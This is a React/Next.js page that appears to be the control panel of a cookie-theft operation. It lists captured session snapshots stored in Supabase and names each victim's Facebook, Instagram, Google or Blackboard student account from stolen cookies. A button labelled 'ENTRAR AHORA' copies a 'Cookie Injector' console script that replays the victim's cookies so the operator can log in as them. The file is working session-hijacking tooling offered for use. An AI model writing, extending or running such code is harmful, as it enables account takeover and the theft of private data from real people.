"use client";

import React, { useEffect, useState } from "react";
import { supabase, SessionSnapshot, Cookie } from "@/lib/supabase";
import GlassCard from "@/components/GlassCard";
import { 
  Search, Filter, Clock, User, Globe, ExternalLink, 
  Shield, Facebook, Instagram, GraduationCap, LayoutGrid, List
} from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";

interface AccountInfo {
  platform: "Facebook" | "Instagram" | "Google" | "Blackboard" | "Unknown";
  identifier: string;
  icon: any;
  color: string;
}

export default function SessionsPage() {
  const [sessions, setSessions] = useState<SessionSnapshot[]>([]);
  const [loading, setLoading] = useState(true);
  const [searchTerm, setSearchTerm] = useState("");
  const [selectedSession, setSelectedSession] = useState<SessionSnapshot | null>(null);
  const [cookies, setCookies] = useState<Cookie[]>([]);
  const [loadingCookies, setLoadingCookies] = useState(false);
  const [viewMode, setViewMode] = useState<"grid" | "list">("grid");
  const [accountMap, setAccountMap] = useState<Record<string, AccountInfo>>({});

  useEffect(() => {
    fetchSessions();
  }, []);

  const identifyAccount = (sessionCookies: Cookie[]): AccountInfo => {
    // Facebook Logic
    const fbCookie = sessionCookies.find(c => c.domain.includes("facebook.com") && c.name === "c_user");
    if (fbCookie) return { platform: "Facebook", identifier: fbCookie.value, icon: Facebook, color: "text-blue-500" };

    // Instagram Logic
    const igCookie = sessionCookies.find(c => c.domain.includes("instagram.com") && c.name === "ds_user_id");
    if (igCookie) return { platform: "Instagram", identifier: igCookie.value, icon: Instagram, color: "text-pink-500" };

    // Google Logic
    const gCookie = sessionCookies.find(c => c.domain.includes("google.com") && (c.name === "SID" || c.name === "HSID"));
    if (gCookie) return { platform: "Google", identifier: "Google Account", icon: Globe, color: "text-red-400" };

    // Blackboard / UP Logic
    const bbCookie = sessionCookies.find(c => c.domain.includes("up.edu.pe") || c.domain.includes("blackboard.com"));
    if (bbCookie) return { platform: "Blackboard", identifier: "UP Student", icon: GraduationCap, color: "text-blue-400" };

    return { platform: "Unknown", identifier: "Generic Session", icon: Shield, color: "text-gray-400" };
  };

  const fetchSessions = async () => {
    setLoading(true);
    const { data: sessionData, error: sessionError } = await supabase
      .from("session_snapshots")
      .select("*")
      .order("captured_at", { ascending: false });
    
    if (sessionData) {
      setSessions(sessionData);
      
      // Identify accounts for each session
      const newAccountMap: Record<string, AccountInfo> = {};
      for (const session of sessionData) {
        const { data: cookieData } = await supabase
          .from("cookies")
          .select("*")
          .eq("snapshot_id", session.id);
        
        if (cookieData) {
          newAccountMap[session.id] = identifyAccount(cookieData);
        }
      }
      setAccountMap(newAccountMap);
    }
    setLoading(false);
  };

  const fetchCookies = async (snapshotId: string) => {
    setLoadingCookies(true);
    const { data, error } = await supabase
      .from("cookies")
      .select("*")
      .eq("snapshot_id", snapshotId);
    
    if (data) setCookies(data);
    setLoadingCookies(false);
  };

  const handleSessionClick = (session: SessionSnapshot) => {
    setSelectedSession(session);
    fetchCookies(session.id);
  };

  const generateConsoleScript = () => {
    if (cookies.length === 0) return "";
    
    const script = `(function() {
  const cookies = ${JSON.stringify(cookies)};
  console.log('%c Cookie Injector v1.0 ', 'background: #2563eb; color: #fff; font-weight: bold;');
  console.log('Restoring ' + cookies.length + ' cookies for ' + window.location.hostname);
  
  cookies.forEach(c => {
    try {
      const cookieStr = c.name + '=' + c.value + 
                      '; domain=' + c.domain + 
                      '; path=' + (c.path || '/') + 
                      '; SameSite=' + (c.same_site || 'Lax') +
                      (c.secure ? '; Secure' : '');
      document.cookie = cookieStr;
    } catch (e) {
      console.error('Failed to set cookie: ' + c.name, e);
    }
  });
  
  console.log('%c Success! Reloading page...', 'color: #10b981; font-weight: bold;');
  setTimeout(() => location.reload(), 1000);
})();`;

    navigator.clipboard.writeText(script);
    alert("¡Script copiado! Pégalo en la consola de la página destino (ej: facebook.com)");
  };

  const filteredSessions = sessions.filter(s => 
    s.user_id?.toLowerCase().includes(searchTerm.toLowerCase()) ||
    accountMap[s.id]?.identifier.toLowerCase().includes(searchTerm.toLowerCase())
  );

  return (
    <div className="space-y-8 max-w-7xl mx-auto">
      <header className="flex flex-col md:flex-row md:items-center justify-between gap-4">
        <div>
          <h2 className="text-3xl font-bold tracking-tight">Active Accounts</h2>
          <p className="text-gray-400">Captured sessions automatically identified from cookies.</p>
        </div>
        
        <div className="flex items-center gap-3">
          <div className="glass flex items-center px-4 py-2 rounded-2xl border border-white/10 focus-within:border-blue-500/50 transition-colors w-full md:w-64">
            <Search className="text-gray-500 mr-2" size={18} />
            <input 
              type="text" 
              placeholder="Search ID or Account..." 
              className="bg-transparent border-none outline-none text-sm w-full py-2"
              value={searchTerm}
              onChange={(e) => setSearchTerm(e.target.value)}
            />
          </div>
          <div className="glass p-1 rounded-xl flex gap-1">
            <button 
              onClick={() => setViewMode("grid")}
              className={`p-2 rounded-lg transition-colors ${viewMode === "grid" ? "bg-blue-600 text-white" : "text-gray-500 hover:text-white"}`}
            >
              <LayoutGrid size={18} />
            </button>
            <button 
              onClick={() => setViewMode("list")}
              className={`p-2 rounded-lg transition-colors ${viewMode === "list" ? "bg-blue-600 text-white" : "text-gray-500 hover:text-white"}`}
            >
              <List size={18} />
            </button>
          </div>
        </div>
      </header>

      <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
        <div className="lg:col-span-12">
          {loading ? (
            <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
              {[1, 2, 3, 4].map(i => <div key={i} className="h-48 glass rounded-3xl animate-pulse" />)}
            </div>
          ) : viewMode === "grid" ? (
            <div className="grid grid-cols-1 md:grid-cols-3 lg:grid-cols-4 gap-6">
              {filteredSessions.map((session, idx) => {
                const info = accountMap[session.id] || { platform: "Unknown", identifier: "Loading...", icon: Shield, color: "text-gray-500" };
                return (
                  <motion.div
                    key={session.id}
                    layoutId={session.id}
                    initial={{ opacity: 0, y: 20 }}
                    animate={{ opacity: 1, y: 0 }}
                    transition={{ delay: idx * 0.05 }}
                    onClick={() => handleSessionClick(session)}
                    className={`glass p-6 rounded-3xl cursor-pointer border-2 transition-all hover:scale-[1.02] active:scale-[0.98] ${selectedSession?.id === session.id ? "border-blue-500 shadow-lg shadow-blue-500/20" : "border-transparent hover:border-white/10"}`}
                  >
                    <div className="flex items-start justify-between mb-4">
                      <div className={`p-3 rounded-2xl bg-white/5 ${info.color}`}>
                        <info.icon size={28} />
                      </div>
                      <div className="glass-pill px-3 py-1 rounded-full text-[10px] font-bold uppercase tracking-wider text-gray-400">
                        {info.platform}
                      </div>
                    </div>
                    <div>
                      <h4 className="font-bold text-lg truncate mb-1">{info.identifier}</h4>
                      <div className="flex items-center gap-2 text-xs text-gray-500">
                        <Clock size={12} />
                        {new Date(session.captured_at).toLocaleDateString()}
                      </div>
                    </div>
                  </motion.div>
                );
              })}
            </div>
          ) : (
            <div className="glass overflow-hidden rounded-3xl border border-white/10">
              <table className="w-full text-left">
                <thead className="border-b border-white/10 bg-white/5">
                  <tr>
                    <th className="px-6 py-4 text-xs font-bold uppercase text-gray-400">Account</th>
                    <th className="px-6 py-4 text-xs font-bold uppercase text-gray-400">Captured At</th>
                    <th className="px-6 py-4 text-xs font-bold uppercase text-gray-400 text-right">Action</th>
                  </tr>
                </thead>
                <tbody className="divide-y divide-white/5">
                  {filteredSessions.map((session) => {
                    const info = accountMap[session.id] || { platform: "Unknown", identifier: "Loading...", icon: Shield, color: "text-gray-500" };
                    return (
                      <tr 
                        key={session.id} 
                        onClick={() => handleSessionClick(session)}
                        className={`hover:bg-white/5 cursor-pointer transition-colors ${selectedSession?.id === session.id ? "bg-blue-500/10" : ""}`}
                      >
                        <td className="px-6 py-4">
                          <div className="flex items-center gap-3">
                            <div className={`p-2 rounded-lg bg-white/5 ${info.color}`}><info.icon size={16} /></div>
                            <div>
                              <p className="font-medium">{info.identifier}</p>
                              <p className="text-xs text-gray-500">{info.platform}</p>
                            </div>
                          </div>
                        </td>
                        <td className="px-6 py-4 text-sm text-gray-400">
                          {new Date(session.captured_at).toLocaleString()}
                        </td>
                        <td className="px-6 py-4 text-right">
                          <button className="text-blue-500 hover:text-blue-400 transition-colors"><ExternalLink size={18} /></button>
                        </td>
                      </tr>
                    );
                  })}
                </tbody>
              </table>
            </div>
          )}
        </div>

        <AnimatePresence>
          {selectedSession && (
            <motion.div 
              initial={{ opacity: 0, height: 0 }}
              animate={{ opacity: 1, height: "auto" }}
              exit={{ opacity: 0, height: 0 }}
              className="lg:col-span-12"
            >
              <GlassCard className="mt-8 border-2 border-blue-500/50">
                <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 mb-8">
                  <div className="flex items-center gap-4">
                    <div className={`p-4 rounded-3xl bg-blue-500/10 ${accountMap[selectedSession.id]?.color}`}>
                      {accountMap[selectedSession.id]?.icon && React.createElement(accountMap[selectedSession.id].icon, { size: 32 })}
                    </div>
                    <div>
                      <h3 className="text-2xl font-bold">{accountMap[selectedSession.id]?.identifier}</h3>
                      <p className="text-gray-400">Full cookie snapshot for {accountMap[selectedSession.id]?.platform}</p>
                    </div>
                  </div>
                  
                  <div className="flex gap-4">
                    <button 
                      onClick={() => setSelectedSession(null)}
                      className="px-6 py-3 rounded-2xl glass hover:bg-white/10 transition-colors font-semibold"
                    >
                      Cerrar
                    </button>
                    <button 
                      onClick={generateConsoleScript}
                      className="flex items-center gap-2 px-8 py-3 rounded-2xl bg-blue-600 hover:bg-blue-500 transition-all font-bold shadow-xl shadow-blue-500/20 active:scale-95"
                    >
                      <ExternalLink size={20} />
                      ENTRAR AHORA
                    </button>
                  </div>
                </div>

                <div className="max-h-[400px] overflow-y-auto pr-2 custom-scrollbar">
                  <table className="w-full text-left text-sm">
                    <thead className="sticky top-0 bg-transparent backdrop-blur-md border-b border-white/10">
                      <tr>
                        <th className="py-3 font-medium text-gray-400">Domain</th>
                        <th className="py-3 font-medium text-gray-400">Name</th>
                        <th className="py-3 font-medium text-gray-400">Value (Truncated)</th>
                        <th className="py-3 font-medium text-gray-400 text-center uppercase text-[10px]">Sec</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-white/5">
                      {loadingCookies ? (
                        <tr><td colSpan={4} className="py-20 text-center text-gray-500">Loading cookies...</td></tr>
                      ) : cookies.map((cookie, idx) => (
                        <tr key={idx} className="hover:bg-white/5 transition-colors">
                          <td className="py-3 font-medium"><Globe size={12} className="inline mr-2 text-blue-400" /> {cookie.domain}</td>
                          <td className="py-3 font-mono text-xs text-blue-300">{cookie.name}</td>
                          <td className="py-3 truncate max-w-[300px] font-mono text-[10px] text-gray-500">{cookie.value}</td>
                          <td className="py-3 text-center">{cookie.secure ? "" : ""}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </GlassCard>
            </motion.div>
          )}
        </AnimatePresence>
      </div>
    </div>
  );
}
